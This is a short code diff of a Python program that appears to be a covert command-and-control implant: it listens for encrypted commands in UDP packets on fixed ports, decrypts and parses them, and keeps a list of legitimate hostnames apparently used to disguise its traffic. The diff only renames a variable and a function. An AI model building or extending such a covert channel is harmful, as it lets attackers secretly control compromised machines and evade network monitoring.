@@ -51,7 +51,7 @@ NETWORK_INTERFACE = ARGS.interface
 ENCRYPTION_HANDLER = StreamEncryption()
 
 # List of legit hostnames
-hostnames = ["play.google.com",
+HOSTNAMES = ["play.google.com",
              "pixel.33across.com",
              "signaler-pa.clients6.google.com",
              "www.youtube.com",
@@ -73,12 +73,12 @@ class DirectoryNotFound(Exception): pass
 
 
 def get_random_hostname():
-    size = len(hostnames)
+    size = len(HOSTNAMES)
     index = randint(0, size-1)
-    return hostnames[index]
+    return HOSTNAMES[index]
 
 
-def receive_dns_command(pkt):
+def receive_udp_command(pkt):
     msg_len = pkt[UDP].len
     ciphertext = bytes(pkt[UDP].payload)[0:msg_len]
     msg_bytes = ENCRYPTION_HANDLER.decrypt(ciphertext)
@@ -164,7 +164,7 @@ def packet_handler(pkt):
     """
     if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
         return
-    command = receive_dns_command(pkt)
+    command = receive_udp_command(pkt)
     print(f"Received: {command}")
     argv = command.split(" ")
     argc = len(argv)
